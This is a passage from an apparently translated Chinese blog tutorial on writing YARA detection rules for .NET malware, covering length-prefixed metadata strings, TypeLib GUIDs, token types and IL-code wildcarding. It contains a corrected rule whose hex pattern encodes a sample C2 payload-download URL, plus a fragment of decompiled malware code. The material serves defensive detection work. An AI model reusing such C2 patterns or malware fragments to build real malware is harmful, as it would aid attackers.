          &lt;th&gt;压缩大小&lt;/th&gt;
          &lt;th&gt;压缩值&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0x0-0x7F&lt;/td&gt;
          &lt;td&gt;1字节&lt;/td&gt;
          &lt;td&gt;&amp;lt;值&amp;gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;0x80-0x3FFF&lt;/td&gt;
          &lt;td&gt;2字节&lt;/td&gt;
          &lt;td&gt;0x8000&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;0x4000-0x1FFFFFFF&lt;/td&gt;
          &lt;td&gt;4字节&lt;/td&gt;
          &lt;td&gt;0xC0000000&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;只要#US字符串和#Blob条目短于128字节，前置压缩长度与实际长度相同。大多数恶意软件分析师想要创建的模式很可能就是这种情况。&lt;/p&gt;
&lt;p&gt;正是由于前置长度，当长度恰好是字母数字字符时，fullword修饰符可能会阻止匹配。&lt;/p&gt;
&lt;h2 id=&#34;guid&#34;&gt;GUID
&lt;/h2&gt;&lt;p&gt;我们示例截图中显示的GUID也称为TypeLib ID，Brian Wallace在其文章《使用.NET GUID帮助搜寻恶意软件》[1]中首次描述。&lt;/p&gt;
&lt;p&gt;Typelib ID由Visual Studio添加，唯一标识项目。它保存在#Blob流中，因此始终以长度0x24（即&amp;rsquo;$&amp;lsquo;字符）为前缀。这是一个强大的模式，可以独立存在，并且对重新编译具有鲁棒性。&lt;/p&gt;
&lt;p&gt;对于像AgentTesla这样源代码泄露的恶意软件家族，如果目标是检测该家族，则可能不应使用TypeLib ID。&lt;/p&gt;
&lt;p&gt;Wallace提到的另一个GUID是#GUID流中的MVID。MVID随重新编译而变化，适用于识别特定样本（例如查看是否重新打包了相同载荷）。它不适用于编写抗重新编译的检测规则。&lt;/p&gt;
&lt;h2 id=&#34;案例1的修正规则&#34;&gt;案例1的修正规则
&lt;/h2&gt;&lt;p&gt;现在我们可以修正基于程序集信息截图的错误YARA规则：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rule Fixed_AssemblyInfo_Rule {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    strings:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $guid = &amp;#34;$\x24\x00\x00\x00\x91\xA2\xF3\xAE\x31\xA2\x4F\x72\xB8\x9A\xEB\x35\xB4\x1D\x48\xA6\xBF\xF5\xD7\x8D\x39\x91\x18\x64\x94\xBF\x7C\x00\x00&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $title = &amp;#34;a\x34\x00\x00\x00\x4D\x79\x20\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x20\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x20\x67\x6F\x65\x73\x20\x68\x65\x72\x65&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $url = { 80 C5 00 68 00 74 00 74 00 70 00 73 00 3A 00 2F 00 2F 00 77 00 77 00 77 00 2E 00 6D 00 79 00 63 00 32 00 73 00 65 00 72 00 76 00 65 00 72 00 2E 00 63 00 6F 00 6D 00 2F 00 70 00 61 00 79 00 6C 00 6F 00 61 00 64 00 2E 00 70 00 68 00 70 00 3F 00 69 00 64 00 3D 00 7B 00 30 00 7D 00 00 }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $timestamp = &amp;#34;MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x00\x00\x00\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD!\xB8\x01L\xCD!This program cannot be run in DOS mode.\r\r\n$\x00\x00\x00\x00\x00\x00\x00\x93\xE5\x05\x00&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $forms = &amp;#34;\x00WindowsFormsApp54\x00&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    condition:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        $guid and $title and $url and $timestamp and $forms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在修正的YARA规则中，我们移除了&amp;quot;AssemblyTitle&amp;quot;和&amp;quot;Guid&amp;quot;字符串，因为这些字符串编码在元数据表中，实际不出现在二进制文件中。&lt;/p&gt;
&lt;p&gt;此外，我们使用基于表1的格式。$guid和$title字符串来自程序集信息，因此保存在#Blob流中并带有前置压缩长度。这意味着不需要wide修饰符。&lt;/p&gt;
&lt;p&gt;常见缺陷是在#Blob（或#US）字符串中使用YARA的fullword修饰符。前置长度可能在字母数字范围内，如我们示例中的$title。其长度为0x34，恰好也是字符&amp;rsquo;a&amp;rsquo;。因此，fullword修饰符会阻止此类字符串的匹配，这不是我们想要的。&lt;/p&gt;
&lt;p&gt;通过检查前置长度，我们有一个极好的替代方案来实现fullword修饰符的意图。检查长度有三种不同方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可直接嵌入字符串模式（见$guid和$title）&lt;/li&gt;
&lt;li&gt;可使用十六进制模式（此处未显示），但由于可读性较差，建议用解码字符串的注释补充&lt;/li&gt;
&lt;li&gt;可在条件中检查长度，这对保持可读的宽字符串很有用（见$url的条件）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除了能像fullword修饰符一样工作外，包含前置长度还为特征模式添加了结构上下文。意外作为方法名（#Strings流）出现的程序集信息文本可能不是我们要找的模式。&lt;/p&gt;
&lt;p&gt;为了展示#US字符串和2字节压缩长度的另一个示例，我还添加了$url。这样的下载URL可能在分析报告中提到，这里我们假设它可能被IL代码引用，因此是#US流的一部分。该URL的长度为98字符，即98*2=96字节（0xC4），因为#US以UTF-16保存它们。此外，#US流条目有一个附加的0x0或0x1，这意味着我们必须将长度加1字节，现在是0xC5。值0xC5在0x80–0x3FFF范围内，因此使用2字节编码该长度。应用公式得到：(0x8000 | 0xC5) = 0x80C5。&lt;/p&gt;
&lt;p&gt;错误的$timestamp没有考虑时间戳以小端格式保存。知道此时间戳是PE头的一部分，我们通过将其放置在PE签名固定偏移处来为模式添加上下文。或者，YARA的&amp;quot;pe&amp;quot;模块解析时间戳——然而解析的缺点是性能可能更差，且只能在足够有效的PE映像上运行，但可能无法检测嵌入文件、内存转储或损坏文件中的恶意软件。因此，更通用的选择是基于模式的解决方案。&lt;/p&gt;
&lt;p&gt;最后，我们更改$forms字符串，因为&amp;quot;WindowsFormsApp54&amp;quot;、&amp;ldquo;Program&amp;quot;和&amp;quot;Main&amp;quot;是命名空间、类和方法，作为单独条目放在#Strings堆中。它们的连接编码在元数据表中，无法用单个模式覆盖。我们从YARA规则中完全移除&amp;quot;Program&amp;quot;和&amp;quot;Main&amp;rdquo;，因为它们是相对常见的字符串。&amp;ldquo;WindowsFormsApp54&amp;quot;是Visual Studio使用的默认名称。除了编程练习外，它在干净文件中应该不常见，加上时间戳我们可能会找到用于截图的样本。由于&amp;quot;WindowsFormsApp54&amp;quot;保存在#Strings中，它被零字节包围。&lt;/p&gt;
&lt;p&gt;一个警告：特别是对于威胁狩猎规则，通常必须在没有样本的情况下编写，手动计算压缩长度等细节可能容易出错。但了解.NET流中使用的底层结构和编码有助于避免我们在错误狩猎规则中看到的典型错误。当您为生产环境制作实际检测规则时，这些结构细节很容易提取，并且能很好地避免误报。&lt;/p&gt;
&lt;h2 id=&#34;案例2检测方法和il代码&#34;&gt;案例2：检测方法和IL代码
&lt;/h2&gt;&lt;p&gt;对于简单情况，恶意.NET样本的字符串列表提供足够信息来编写YARA规则。然而，混淆使这种方法无法使用，如果它对用户定义字符串进行编码并替换方法、字段和类名。要成功为此类文件创建规则，多才多艺的分析师可能需要查看实际IL代码和方法签名。&lt;/p&gt;
&lt;p&gt;我们将为案例2查看的方法如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;array&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Dictionary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dictionary&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Dictionary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Enumerable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ToString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;X2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;dictionary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// ... 其余代码 ...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;令牌&#34;&gt;令牌
&lt;/h2&gt;&lt;p&gt;任何为x86代码编写规则的人都知道，函数或数据位置的地址通常应该被通配以创建鲁棒的特征模式。这是因为对代码的小改动（如额外变量、函数和指令）也会在重新编译后影响这些地址。&lt;/p&gt;
&lt;p&gt;.NET令牌在这方面类似于x86中的地址。就像地址一样，它们的值可能随重新编译而改变。然而，它们并不完全相同，通配整个令牌不建议。&lt;/p&gt;
&lt;p&gt;.NET程序集中有两种令牌：编码令牌和非编码令牌。非编码令牌是IL代码的一部分。&lt;/p&gt;
&lt;p&gt;.NET元数据由许多表组成，这些表定义类、参数、方法等。令牌引用元数据表中的一行。这意味着它们描述两个数据点：指定使用哪行的记录标识符和指示引用哪个表的表索引。&lt;/p&gt;
&lt;p&gt;每个令牌由4字节组成。第一个字节是表索引，也称为令牌类型。剩余的2-4字节是记录标识符(RID)。第一个字节定义元数据表，RID定义该表中的哪个条目被使用。&lt;/p&gt;
&lt;p&gt;为什么表索引也称为令牌类型？这是因为每个元数据表负责存储某种类型的条目。例如，方法保存在mdtMethodDef表中，这意味着指向该表的任何令牌都是方法定义引用，令牌类型为0x06。&lt;/p&gt;
&lt;p&gt;令牌类型本身在每个.NET程序集中具有相同的值，使其成为编写规则时的重要数据点。下表列出它们的值（参见[2]第76页）。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;令牌类型&lt;/th&gt;
          &lt;th&gt;值 (RID&lt;/th&gt;
          &lt;th&gt;(Type &amp;laquo; 24))&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtModule&lt;/td&gt;
          &lt;td&gt;0x00000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtTypeRef&lt;/td&gt;
          &lt;td&gt;0x01000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtTypeDef&lt;/td&gt;
          &lt;td&gt;0x02000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtFieldDef&lt;/td&gt;
          &lt;td&gt;0x04000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtMethodDef&lt;/td&gt;
          &lt;td&gt;0x06000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtParamDef&lt;/td&gt;
          &lt;td&gt;0x08000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtInterfaceDef&lt;/td&gt;
          &lt;td&gt;0x09000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtMemberRef&lt;/td&gt;
          &lt;td&gt;0x0A000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtCustomAttribute&lt;/td&gt;
          &lt;td&gt;0x0C000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtPermission&lt;/td&gt;
          &lt;td&gt;0x0E000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtSignature&lt;/td&gt;
          &lt;td&gt;0x11000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtEvent&lt;/td&gt;
          &lt;td&gt;0x14000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtProperty&lt;/td&gt;
          &lt;td&gt;0x17000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtModuleRef&lt;/td&gt;
          &lt;td&gt;0x1A000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtTypeSpec&lt;/td&gt;
          &lt;td&gt;0x1B000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtAssembly&lt;/td&gt;
          &lt;td&gt;0x20000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtAssemblyRef&lt;/td&gt;
          &lt;td&gt;0x23000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtFile&lt;/td&gt;
          &lt;td&gt;0x26000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtExportedType&lt;/td&gt;
          &lt;td&gt;0x27000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtManifestResource&lt;/td&gt;
          &lt;td&gt;0x28000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtGenericParam&lt;/td&gt;
          &lt;td&gt;0x2A000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtMethodSpec&lt;/td&gt;
          &lt;td&gt;0x2B000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mdtGenericParamConstraint&lt;/td&gt;
          &lt;td&gt;0x2C000000&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;另一方面，RID更应该被通配，因为与x86中的地址类似，当添加或删除表条目并重新编译样本时，它们的值可能会改变。&lt;/p&gt;
&lt;h2 id=&#34;il代码模式与通配符&#34;&gt;IL代码模式与通配符
&lt;/h2&gt;&lt;p&gt;让我们利用关于令牌的知识创建IL代码规则。要查看操作码，请在dnSpy中打开样本并选择&amp;quot;IL代码&amp;quot;作为语言。然后复制并粘贴要添加到规则中的代码序列。&lt;/p&gt;
&lt;p&gt;我们Buffer方法的部分输出如下。此代码初始化大小为256的数组和字典，然后使用Enumerable.Range(0, 256)迭代数组。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/* 0x00000378 2000010000   */ IL_0000: ldc.i4    256 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/* 0x0000037D 8D19000001   */ IL_0005: newarr    [mscorlib]System.String 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/* 0x00000382 0A           */ IL_000A: stloc.0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/* 0x00000383 731F00000A   */ IL_000B: newobj    instance void class [mscorlib]System.Collections.Generic.Dictionary`2&amp;lt;string, uint8&amp;gt;::.ctor() 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/* 0x00000388 0B           */ IL_0010: stloc.1 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/* 0x00000389 16           */ IL_0011: ldc.i4.0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/* 0x0000038A 2000010000   */ IL_0012: ldc.i4    256 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/* 0x0000038F 282000000A   */ IL_0017: call      class [mscorlib] System.Collections.Generic.IEnumerable`1&amp;lt;int32&amp;gt; [System.Core]System.Linq.Enumerable::Range(int32, int32)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;操作码部分是此列表中的第二列。例如，最后一个调用Range(0,256)的指令有以下十六进制字节序列：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;28 20 00 00 0A
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;第一个字节0x28是call指令的操作码。接下来的三个字节0x20 0x00 0x00是RID，因为令牌以小端格式保存。最后一个字节0x0A是令牌类型mdtMemberRef。&lt;/p&gt;
&lt;p&gt;这意味着对于此call指令，我们通配2-4字节，因为我们想保留调用成员引用的信息。生成的子模式如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
